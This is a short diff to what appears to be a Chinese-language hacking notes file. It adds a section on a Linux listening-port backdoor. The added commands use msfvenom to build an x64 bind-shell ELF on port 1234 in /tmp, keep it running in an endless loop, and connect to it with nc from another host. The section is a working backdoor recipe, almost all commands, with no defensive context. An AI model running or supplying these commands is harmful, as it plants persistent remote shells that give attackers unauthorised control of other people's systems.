@@ -103,3 +103,13 @@ drwxr-xr-x 2 hack hack  4096 Apr 12 05:06 1
 -rw-r--r-- 1 hack hack  2658 Apr 12 05:06 ww.py
 ```
 
+### linux监听端口后门
+
+```
+msfvenom -l|grep linux
+msfvenom -p linux/x64/shell_bind_tcp LPORT=1234 -f elf >/tmp/ss
+while true;do /tmp/ss;done
+
+nc 192.168.2.1 1234
+``
+
